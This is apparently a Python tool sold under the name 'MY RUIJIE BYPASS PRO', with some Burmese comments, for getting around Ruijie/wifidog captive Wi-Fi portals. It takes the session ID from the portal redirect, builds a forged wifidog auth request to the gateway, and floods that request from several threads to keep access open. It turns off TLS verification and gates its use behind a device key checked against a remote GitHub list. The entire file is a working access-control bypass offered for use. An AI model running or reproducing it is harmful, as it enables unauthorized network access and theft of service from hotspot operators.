import os
import requests
import re
import urllib3
import time
import threading
import random
import uuid
import sys
from urllib.parse import urlparse, parse_qs, urljoin
from colorama import Fore, Back, Style, init

# SSL Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ===============================
# LICENSE CONFIG (FIXED)
# ===============================
GITHUB_URL = "https://raw.githubusercontent.com/htethtet277-svg/my-database-/main/key.txt"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".device_key")

# ===============================
# SYSTEM FUNCTIONS
# ===============================
def get_or_create_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            return f.read().strip()
    else:
        new_key = str(uuid.uuid4())[:12].upper()
        with open(KEY_FILE, "w") as f:
            f.write(new_key)
        return new_key

def check_real_internet():
    try:
        return requests.get("http://1.1.1.1", timeout=3).status_code == 200
    except:
        return False

def h_banner():
    os.system('clear')
    print(f"{Fore.MAGENTA}{'='*55}")
    print(f"{Fore.CYAN}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
    print(f"{Fore.CYAN} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
    print(f"{Fore.CYAN} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
    print(f"{Fore.CYAN} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
    print(f"{Fore.CYAN} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
    print(f"{Fore.CYAN} ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
    print(f"{Fore.MAGENTA}{'='*55}")
    print(f"{Fore.WHITE}{Back.RED}      MY RUIJIE BYPASS PRO | OWNER: HH TET TET      ")
    print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")

# ===============================
# BYPASS CORE LOGIC
# ===============================
def high_speed_ping(auth_link, sid):
    while True:
        try:
            requests.get(auth_link, timeout=5)
            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID: {sid} | Pulse Active...           ", end="\r")
        except:
            break
        time.sleep(random.uniform(0.05, 0.2))

def start_bypass_process():
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            if r.status_code == 204 and check_real_internet():
                print(f"{Fore.YELLOW}[•]{Fore.RESET} Internet Active... Ready        ", end="\r")
                time.sleep(5)
                continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            
            r2 = requests.get(portal_url, verify=False, timeout=10)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if sid:
                print(f"\n{Fore.GREEN}[✓]{Fore.RESET} Captured Session ID: {sid}")
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                for _ in range(5):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
                
                while check_real_internet(): time.sleep(5)
        except:
            time.sleep(5)

# ===============================
# LICENSE VERIFICATION
# ===============================
def verify_license():
    h_banner()
    user_key = get_or_create_key()
    print(f"{Fore.YELLOW}[i] Checking security clearance...")
    print(f"{Fore.WHITE}└─ Your Device ID: {Fore.GREEN}{user_key}")
    
    try:
        response = requests.get(GITHUB_URL, timeout=10)
        if response.status_code == 200:
            if user_key in response.text:
                print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
                return True
            else:
                print(f"{Fore.RED}❌ DEVICE ID NOT REGISTERED")
                print(f"{Fore.YELLOW}GitHub က key.txt ထဲမှာ {user_key}|ACTIVE လို့ သွားထည့်ပေးပါ။")
                sys.exit()
    except:
        print(f"{Fore.RED}❌ ERROR: CANNOT CONNECT TO GITHUB")
        sys.exit()

if __name__ == "__main__":
    if verify_license():
        start_bypass_process()
